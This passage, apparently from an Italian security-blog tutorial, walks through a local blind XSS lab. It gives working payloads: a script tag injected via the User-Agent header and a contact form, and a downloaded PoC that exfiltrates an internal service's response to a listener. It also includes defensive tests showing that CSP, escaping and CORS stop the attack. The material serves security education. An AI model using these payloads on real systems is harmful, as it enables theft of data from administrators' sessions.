Con Burp (o `curl`) manda una richiesta con il payload nell'header:

```bash
# Inject the payload in the User-Agent header
curl -s http://127.0.0.1:8020/ -A '<script src="http://127.0.0.1:8021/p.js?id=ua_header"></script>' > /dev/null
```

Da admin apri `http://127.0.0.1:8020/admin-logs`. Callback:

```text
CALLBACK id=ua_header | url=http://127.0.0.1:8020/admin-logs | cookies=theme
```

Attenzione: l'header da solo non basta. Funziona perché questa pagina di log stampa il valore **senza escaping**. Se il pannello fa l'encoding, il payload resta testo.

### Test 3: la CSP ferma il callback

Reinvia il payload del Test 1 e apri la pagina con CSP:

```text
http://127.0.0.1:8020/admin-csp
```

Nessun callback. La pagina ha `Content-Security-Policy: default-src 'self'`, quindi lo script su `127.0.0.1:8021` è bloccato. La Console del browser mostra `Refused to load the script`. Il payload è stato iniettato, ma non può eseguirsi.

### Test 4: la versione sicura

```text
http://127.0.0.1:8020/admin-safe
```

Qui nomi e log passano da `html.escape()`. Vedi il testo del payload scritto in chiaro e nessun callback.

### Test 5: esfiltrare un URL interno con il tool HackITA

Scarica lo script e punta i due valori al lab (l'URL interno e il listener):

```bash
# Download the HackITA PoC into the attacker folder
curl -s https://raw.githubusercontent.com/hack-ita/xss-internal-exfil-poc/main/myexfilxss.js -o blind-lab/attacker/myexfilxss.js
```

```bash
# Point the internal URL and the listener to the lab
sed -i 's#http://127.0.0.1:4566/#http://127.0.0.1:8030/#; s#http://10.10.14.212/exfil#http://127.0.0.1:8021/exfil#' blind-lab/attacker/myexfilxss.js
```

```bash
# Terminal 4: host the script on port 8000
cd blind-lab/attacker && python3 -m http.server 8000
```

Nel form di contatto, nel campo `name`, inserisci:

```html
<script src="http://127.0.0.1:8000/myexfilxss.js"></script>
```

Da admin riapri `http://127.0.0.1:8020/admin`. Nel Terminale 2 compare il contenuto del servizio interno, già decodificato dal listener:

```text
EXFIL decoded body: '{"internal_service": "only reachable from the admin machine"}'
```

### Test 6: senza header CORS il tool non legge niente

Cambia nello script l'URL interno in `http://127.0.0.1:8030/nocors` (stesso servizio, ma senza `Access-Control-Allow-Origin`) e ricarica `/admin`. Nella Console compare l'errore CORS e il listener riceve un body **vuoto**:

```text
EXFIL decoded body: ''
```

È la [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/): lo script gira nell'origine `127.0.0.1:8020` e non può leggere la risposta di `127.0.0.1:8030` se quel servizio non la permette.

## Conclusione

La Blind XSS è pericolosa perché colpisce chi ha più privilegi e perché non dà segnali. Con ID univoci, un server di callback e una matrice dei test la trasformi in un risultato dimostrabile, senza rubare dati. Se difendi: codifica ogni dato nei pannelli interni, metti una CSP sulle pagine admin, tieni `HttpOnly` sulla sessione e monitora le violazioni.

Link utili: [XSS](https://hackita.it/articoli/xss/), [Stored XSS](https://hackita.it/articoli/xss-stored/), [CSP bypass](https://hackita.it/articoli/xss-csp-bypass/), [Burp Suite](https://hackita.it/articoli/burp-suite/).

*Disclaimer: usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato (art. 615-ter c.p.).*
